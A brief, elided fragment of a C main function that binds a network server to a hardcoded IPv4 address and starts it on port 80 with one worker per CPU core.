...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("138.68.10.171"); // Address to bind to
    ...
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "138.68.10.171", 80, "138.68.10.171")) == NULL)
    {
